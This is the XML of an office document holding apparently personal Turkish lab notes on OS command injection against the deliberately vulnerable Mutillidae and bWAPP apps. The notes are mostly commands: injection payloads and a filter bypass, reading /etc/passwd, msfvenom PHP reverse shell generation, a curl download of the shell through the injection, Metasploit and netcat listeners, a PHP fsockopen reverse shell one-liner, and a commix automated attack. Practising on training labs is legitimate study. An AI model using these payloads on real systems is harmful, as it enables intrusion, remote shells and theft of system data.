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Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0027c5d8" officeooo:paragraph-rsid="0027c5d8" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00282e7a" officeooo:paragraph-rsid="00282e7a" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0027c5d8" officeooo:paragraph-rsid="0027c5d8" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0027c5d8"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0027c5d8"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001c490a"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0027c5d8" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5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OS COMMAND INJECTION</text:p>
      <text:p text:style-name="P3">Mutillidae ye girdik</text:p>
      <text:p text:style-name="P3">OWASP 2013 &gt; A1-Injection (other) &gt; Command Injection &gt; DNS Lookup</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">gelen sonuç, shellde olduğu için devamında yazacağımız komutlar aynen çıktı verecek.</text:p>
      <text:p text:style-name="P1">google.com &amp; whoami</text:p>
      <text:p text:style-name="P3">uname -a</text:p>
      <text:p text:style-name="P3">netstat -a</text:p>
      <text:p text:style-name="P3">ps -ef </text:p>
      <text:p text:style-name="P3">cat /etc/passwd</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">OS COMMAND INJECTION (Filter ByPass ile)</text:p>
      <text:p text:style-name="P3">blacklist e alınan kelimeleri kullanmamamız lazım.</text:p>
      <text:p text:style-name="P3">&amp; ve space kullanımına izin vermiyor ama sırasıyla yerlerine | ve &lt; kullanabiliriz.</text:p>
      <text:p text:style-name="P3">Yerine yazma..</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="http://www.nsa.gov/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">www.nsa.gov</text:a>|w\ho\ami <text:s/>(böyle de olabilir)</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="http://www.nsa.gov/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">www.nsa.gov</text:a>|imaohw|rev <text:span text:style-name="T1">| 2&amp;&gt;1/bin/bash</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">KAHVE MOLASI</text:p>
      <text:p text:style-name="P2">msfvenom -p php/reverse_php lhost=10.10.10.80 lport=4455 -f raw &gt; php-shell.php</text:p>
      <text:p text:style-name="P3">http.server <text:s/>(payloadımız hazır ve http.server olduk.)</text:p>
      <text:p text:style-name="P3">10.10.10.80 e girip php-shell yolunu buluyoruz.</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T3">DNS lookup yerine, </text:span>google.com | curl http://10.10.10.80/php-shell.php --output haha.php</text:p>
      <text:p text:style-name="P3">ls ile baktığımızda çalışıyor</text:p>
      <text:p text:style-name="P3">msf console dan, multi handler ayarlıyoruz.</text:p>
      <text:p text:style-name="P3">lhost eth0</text:p>
      <text:p text:style-name="P3">lport 4455</text:p>
      <text:p text:style-name="P3">10.10.10.23/mutilidae/haha.php arattığımızda içerdeyiz..</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">OS COMMAND INJECTION – PHP Reverse Shell Alma</text:p>
      <text:p text:style-name="P2">nc -lvp 4400</text:p>
      <text:p text:style-name="P3">dinlediğimiz porttan shell alacağız.</text:p>
      <text:p text:style-name="P2"><text:bookmark text:name="reverse-shell-command"/>php -r '$sock=fsockopen("10.10.10.80",4400);shell_exec("/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">OS COMMAND INJECTION – Index Atma</text:p>
      <text:p text:style-name="P3">html ile yazı yazdırıp index.html olarak kendimize alıp. Karşıdan çalıştırıyoruz.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">OS COMMAND INJECTION – Otomatik Saldırı ve Shell Alımı</text:p>
      <text:p text:style-name="P4">OS Injection a beewap tan giriyoruz.</text:p>
      <text:p text:style-name="P4">Interceptionaçıkken dns lookup yap. Bunu interceptiondan takip et</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">commix --url="http://10.10.10.22/bWAPP/commandi.php" --cookie="PHPSESSID=7566ctvo9it1bc8ku3l7ggmbm7; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; security_level=0 " --data="target=www.nsa.gov&amp;form=submit" -v 1</text:p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18T23:18:30.223139909</dc:date>
    <meta:editing-duration>PT4H51S</meta:editing-duration>
    <meta:editing-cycles>13</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="35" meta:word-count="193" meta:character-count="1620" meta:non-whitespace-character-count="1460"/>
  </office:meta>
</office:document-meta>
</file>